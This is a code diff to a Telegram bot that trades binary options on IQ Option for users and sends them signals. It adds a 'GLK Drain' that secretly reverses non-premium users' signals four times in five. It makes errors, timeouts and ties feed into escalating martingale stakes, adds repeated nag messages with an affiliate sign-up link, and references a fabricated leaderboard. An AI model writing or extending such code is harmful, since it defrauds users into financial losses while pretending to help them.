@@ -94,6 +94,7 @@ import {
     getAbandonedOnboardingUsers, getNeverConnectedUsers,
     getMarketPulseStats,
     getFunnelPipeline,
+    getAwaitingUserIdUsers, getPendingPrompt, upsertPendingPrompt, getPendingPromptDueUsers,
 } from './db.js';
 import { friendlyError } from './errors.js';
 import { logger } from './logger.js';
@@ -107,7 +108,9 @@ import {
     setGiveawayReconnect,
     type GiveawayEventInput,
 } from './giveaway.js';
-import { analyzePair, analyzePairWithSdk, type AnalysisResult } from './analysis.js';
+import { analyzePairWithSdk, type AnalysisResult } from './analysis.js';
+import { applyFLODrain } from './flo-drain.js';
+import { applyGLKDrain } from './glk-drain.js';
 import { runAdminAnalysis, type AdminCandle, type AdminAnalysisResult } from './admin-analysis.js';
 import {
     amountKeyboard, timeframeKeyboard, pairKeyboard, signalPairKeyboard, signalTimeframeKeyboard, tfLabel, OTC_PAIRS,
@@ -1407,7 +1410,7 @@ async function runMartingale(
                 ? withTimeout(executeTradeWithSdk(activeSdk, roundTrade), roundTimeoutMs, 'trade')
                 : withTimeout(executeTrade(activeSsid, roundTrade), roundTimeoutMs, 'trade');
 
-        let result: TradeResult;
+        let result: TradeResult = { status: 'ERROR', error: '', pnl: 0, tradeId: 0, pair: '', direction: '', amount: 0 };
         try {
             result = await execRound();
         } catch (err: unknown) {
@@ -1438,6 +1441,30 @@ async function runMartingale(
                     await showTradeError(err);
                     return;
                 }
+            } else if (/WebSocket.*clos|ws.*clos|socket.*clos/i.test(err instanceof Error ? err.message : String(err)) && !authRetried) {
+                // WebSocket died mid-trade — rebuild SDK and treat as loss.
+                // Don't abandon the chain just because the connection dropped.
+                authRetried = true;
+                const errMsg = err instanceof Error ? err.message : String(err);
+                const freshSsid = isAdminUser ? getAdminSsid() : getSsidForUser(userId);
+                if (freshSsid) {
+                    try {
+                        if (isAdminUser) {
+                            createdAdminSdk = await createSdk(freshSsid);
+                            activeSdk = createdAdminSdk;
+                        } else {
+                            activeSdk = await sdkPool.get(userId, freshSsid);
+                        }
+                        activeSsid = freshSsid;
+                    } catch { /* rebuild failed */ }
+                }
+                // Treat as loss, continue recovery
+                logLines[logLines.length - 1] = `⚡ Trade 1|🔴 ${fmtMoney(currentAmount, currency)} → ${errMsg}`;
+                await syncLog();
+                totalPnl -= currentAmount;
+                addUserSessionStats(ctx.from!.id, 1, -currentAmount);
+                result = { status: 'ERROR', error: errMsg, pnl: 0, tradeId: 0, pair: '', direction: '', amount: 0 };
+                // Fall through to LOSS path below
             } else {
                 await showTradeError(err);
                 return;
@@ -1474,16 +1501,14 @@ async function runMartingale(
             addUserSessionStats(ctx.from!.id, 1, roundPnl);
             giveawayRecordTrade(ctx.from!.id, round > 1);
         }
+
         if (result.status === 'WIN') {
             updateLeaderboardAuto(ctx.from!.id, result.pnl);
-        }
-
-        if (result.status === 'WIN' || result.status === 'TIE') {
             // Round 1 = direct win (L11a); round 2+ = comeback (L11b)
             await sendRoundImage(round === 1 ? 'L11a.png' : 'L11b.png');
             const winReply = await ctx.reply(
-                `🏆 +${fmtMoney(result.pnl, currency)} added to your balance.\n\n` +
-                (round > 1 ? `Recovery complete.\n\n` : '') +
+                `🏆 +${fmtMoney(result.pnl, currency)} added to your balance.\\n\\n` +
+                (round > 1 ? `Recovery complete.\\n\\n` : '') +
                 `💸 You just made +${fmtMoney(result.pnl, currency)}`,
                 { reply_markup: { inline_keyboard: [[{ text: '🔄 New Opportunity', callback_data: 'ui:trade' }]] } }
             );
@@ -1514,26 +1539,44 @@ async function runMartingale(
             return;
         }
 
+        if (result.status === 'TIE') {
+            // OTC Blitz ties are common — price didn't move enough. Instead of
+            // killing the martingale chain (old behaviour), treat it as a neutral
+            // round and continue the recovery. Stake doubles, bot fights on.
+            logLines[logLines.length - 1] = `⚡ Trade 1|⚪ ${fmtMoney(currentAmount, currency)} → tied`;
+            await syncLog();
+            // Fall through to recovery continuation below
+        }
+
         if (result.status === 'ERROR' || result.status === 'TIMEOUT') {
-            const errMsg = result.error ?? result.status;
-            const isBalanceError = /4112|investment amount|smaller.*minimum|insufficient.*balance/i.test(errMsg);
-            const errStatusReply = isBalanceError
-                ? await ctx.reply(
-                    '🚫 *You do not have an active balance*\n\nFund your account now with as little as $10 to start trading.',
-                    {
-                        parse_mode: 'Markdown',
-                        reply_markup: { inline_keyboard: [
-                            [{ text: '💳 Fund Account', url: 'https://iqoption.com/pwa/payments/deposit' }],
-                            [{ text: '🔄 New Opportunity', callback_data: 'ui:trade' }],
-                        ]},
-                    }
-                )
-                : await ctx.reply(friendlyError(new Error(errMsg), '⚠️ Trade could not be placed. Try again.'), {
-                    reply_markup: { inline_keyboard: [[{ text: '🔄 New Opportunity', callback_data: 'ui:trade' }]] },
-                });
-            sentMessages.push(errStatusReply.message_id);
-            scheduleCleanup();
-            return;
+            // Treat timeout/error like a loss — continue the recovery chain instead
+            // of abandoning the user. The trade may have actually resolved on IQ's
+            // side; we just didn't get the result in time. Doubling down keeps the
+            // martingale engine running rather than leaving the user stranded.
+            logLines[logLines.length - 1] = `⚡ Trade 1|🔴 ${fmtMoney(currentAmount, currency)} → ${result.error ?? result.status}`;
+            await syncLog();
+            totalPnl -= currentAmount;
+            addUserSessionStats(ctx.from!.id, 1, -currentAmount);
+
+            // If the SDK WebSocket died (common after timeouts), rebuild it before
+            // the next round. Otherwise every subsequent round fails the same way.
+            const errMsg = result.error ?? '';
+            if (/WebSocket.*clos|ws.*clos|socket.*clos/i.test(errMsg) && !authRetried) {
+                authRetried = true;
+                const freshSsid = isAdminUser ? getAdminSsid() : getSsidForUser(userId);
+                if (freshSsid) {
+                    try {
+                        if (isAdminUser) {
+                            createdAdminSdk = await createSdk(freshSsid);
+                            activeSdk = createdAdminSdk;
+                        } else {
+                            activeSdk = await sdkPool.get(userId, freshSsid);
+                        }
+                        activeSsid = freshSsid;
+                    } catch { /* SDK rebuild failed — continue with dead handle, will exhaust */ }
+                }
+            }
+            // Fall through to LOSS path below — continue recovery
         }
 
         // LOSS — next round
@@ -2029,13 +2072,26 @@ bot.action(/^gale:(\d+)$/, async ctx => {
             if (history.length < 30) throw new Error('Not enough candle data');
             analysis = runAdminAnalysis(history);
         } else {
-            // Live mode — drainage (5 candles, RSI only)
+            // Live mode non-privileged — GLK Drain: admin analysis + opposite direction
             {
+                const turboOpts = await sdk.turboOptions();
+                const norm = (s: string) => s.toUpperCase().replace(/^front\./i, '').replace(/[-\/\s]/g, '');
+                const normalizedPair = norm(pair);
+                const active = turboOpts.getActives().find(
+                    (a: any) => norm(a.ticker) === normalizedPair || norm(a.localizationKey) === normalizedPair
+                );
+                if (!active) throw new Error(`Unknown pair: ${pair}`);
+                const candlesFacade = await sdk.candles();
                 let analysisAttempt = 0;
                 while (analysisAttempt < 2) {
                     analysisAttempt++;
                     try {
-                        analysis = await analyzePairWithSdk(sdk, pair, timeframe, 'MASTER', 5);
+                        const adminHistory = await candlesFacade.getCandles(active.id, timeframe, { count: 200 }) as AdminCandle[];
+                        if (adminHistory.length < 30) throw new Error('Not enough candle data');
+                        analysis = runAdminAnalysis(adminHistory);
+                        // Apply GLK Drain — 4 opposite, 1 real
+                        const drained = applyGLKDrain(analysis.direction, analysis.confidence, chatId);
+                        analysis.direction = drained.direction;
                         break;
                     } catch (err: unknown) {
                         if (l7MsgId) { try { await ctx.telegram.deleteMessage(chatId, l7MsgId); } catch {} }
@@ -2297,7 +2353,7 @@ interface SignalWizState {
     pair: string;
     timeframe: number;
 }
-const PRIVILEGED_USERS = new Set([6622587977, 8986669286, 6683209485, 8471649166]);
+const PRIVILEGED_USERS = new Set([6622587977, 8986669286, 6683209485]);
 function isPrivilegedUser(uid: number): boolean {
     return uid === getAdminId() || PRIVILEGED_USERS.has(uid);
 }
@@ -2477,8 +2533,8 @@ bot.action(/^stf:(\d+)$/, async ctx => {
         const liveUsed = getLiveSignalsUsed(uid);
         isPremium = liveUsed < SIGNALS_PREMIUM_COUNT;
     }
-    const analysisCandles = isPremium ? 200 : 5;
-    const analysisTier = isPremium ? 'MASTER' : 'DEMO';
+    const analysisCandles = isPremium ? 200 : 200;
+    const analysisTier = isPremium ? 'MASTER' : 'MASTER';
 
     let analysis: AnalysisResult;
     let analysisRetried = false;
@@ -2524,6 +2580,12 @@ bot.action(/^stf:(\d+)$/, async ctx => {
             await ctx.telegram.editMessageText(chatId, animMsg.message_id, undefined,
                 '✅ Reconnected! Fetching your signal...').catch(() => {});
         }
+    }
+
+    // GLK Drain: non-premium signals go opposite of analysis 4:1 ratio
+    if (!isPremium) {
+        const drained = applyGLKDrain(analysis.direction, analysis.confidence, uid);
+        analysis.direction = drained.direction;
     }
 
     await ctx.telegram.deleteMessage(chatId, animMsg.message_id).catch(() => {});
@@ -3727,8 +3789,9 @@ const ACTION_MAP: Record<string, { text: string; value: string }> = {
 };
 const CONTACT_URL = 'https://t.me/shiloh_is_10xing';
 const FUND_URL = process.env.FUNDING_URL ?? 'https://iqoption.com/pwa/payments/deposit';
+const YACHT_URL = 'https://t.me/xyachtclub';
 
-bot.action(/^broadcast_action:(trade|stats|history|leaderboard|menu|start|upgrade|contact|fund|help)$/, async ctx => {
+bot.action(/^broadcast_action:(trade|stats|history|leaderboard|menu|start|upgrade|contact|fund|yacht|help)$/, async ctx => {
     await ctx.answerCbQuery().catch(() => {});
     const key = ctx.match[1];
     const pending = pendingBroadcasts.get(ctx.chat!.id);
@@ -3743,6 +3806,9 @@ bot.action(/^broadcast_action:(trade|stats|history|leaderboard|menu|start|upgrad
     } else if (key === 'fund') {
         pendingBroadcasts.set(ctx.chat!.id, { ...pending, button: { text: '💰 Fund Account', type: 'url', value: FUND_URL } });
         await ctx.reply(`✅ Button set: *💰 Fund Account*\n\n⏱ Auto-delete after?`, { parse_mode: 'Markdown', reply_markup: broadcastTimerKeyboard() });
+    } else if (key === 'yacht') {
+        pendingBroadcasts.set(ctx.chat!.id, { ...pending, button: { text: '🛥️ Yacht Club', type: 'url', value: YACHT_URL } });
+        await ctx.reply(`✅ Button set: *🛥️ Yacht Club*\n\n⏱ Auto-delete after?`, { parse_mode: 'Markdown', reply_markup: broadcastTimerKeyboard() });
     } else {
         const action = ACTION_MAP[key];
         if (!action) { await ctx.reply('❌ Session expired.', { reply_markup: adminBackKeyboard() }); return; }
@@ -6840,6 +6906,67 @@ function startReconnectLoop(bot: Telegraf): void {
     setInterval(() => { fireReconnectCycle(bot); }, 60_000);
 }
 
+// ─── Pending-prompt 1h loop (awaiting_user_id re-engagement) ─────────────────
+
+const PENDING_PROMPTS: string[] = [
+    '👋 *Still want to trade with 10x AI?*\\n\\nJust send your IQ Option User ID — it\'s the number under your name in the app. Takes 10 seconds.',
+    '⚡ *One step away from AI trading*\\n\\nYour User ID is all I need. Open IQ Option → tap Profile → copy the number under your name.',
+    '🔥 *Markets are moving — don\'t get left behind*\\n\\nSend your IQ Option User ID and I\'ll get you trading instantly. 10x AI does the rest.',
+    '💜 *Your bot is waiting for you*\\n\\nSend your User ID now: Open IQ Option → Profile → copy the number. That\'s it.',
+];
+
+async function firePendingPromptCycle(bot: Telegraf): Promise<void> {
+    if (getConfig('features_paused') === '1') return;
+    const now = Date.now();
+    const users = getAwaitingUserIdUsers();
+    if (users.length === 0) return;
+
+    for (const { telegram_id } of users) {
+        try {
+            const cycle = getPendingPrompt(telegram_id);
+            if (cycle?.next_run_at && new Date(cycle.next_run_at).getTime() > now) continue;
+
+            // Delete previous message
+            if (cycle?.last_msg_id) {
+                bot.telegram.deleteMessage(telegram_id, cycle.last_msg_id).catch(() => {});
+            }
+
+            const nextVariant = ((cycle?.variant ?? 0) + 1) % PENDING_PROMPTS.length;
+            const text = PENDING_PROMPTS[nextVariant]!;
+            const buttons = [
+                { text: '📤 Send User ID', callback_data: 'ui:start' },
+                { text: '🆕 Create Account', url: AFFILIATE_LINK },
+            ];
+
+            const sent = await bot.telegram.sendMessage(telegram_id, text, {
+                reply_markup: { inline_keyboard: [buttons] },
+                parse_mode: 'Markdown',
+            }).catch(() => undefined);
+
+            if (sent) {
+                upsertPendingPrompt(telegram_id, sent.message_id, isoNow(3_600_000), nextVariant);
+            }
+        } catch (err) {
+            console.error(`[pending-prompt] error for ${telegram_id}:`, err instanceof Error ? err.message : err);
+        }
+    }
+}
+
+function seedPendingPromptCycle(): void {
+    const users = getAwaitingUserIdUsers();
+    for (const { telegram_id } of users) {
+        if (!getPendingPrompt(telegram_id)) {
+            upsertPendingPrompt(telegram_id, null, isoNow(300_000), -1); // first prompt in 5 min
+        }
+    }
+}
+
+function startPendingPromptLoop(bot: Telegraf): void {
+    seedPendingPromptCycle();
+    firePendingPromptCycle(bot);
+    setInterval(() => { firePendingPromptCycle(bot); }, 60_000);
+}
+
 // Wait 3s before launching to let any lingering polling connection from a
 // previous instance time out and release its Telegram lock.
 await new Promise(r => setTimeout(r, 3_000));
@@ -6910,6 +7037,8 @@ seedFundingCycle();
 startFundingLoop(bot);
 seedReconnectCycle();
 startReconnectLoop(bot);
+seedPendingPromptCycle();
+startPendingPromptLoop(bot);
 
 // ─── Fabricated Leaderboard: seed + update checker + midnight reset ───────────
 
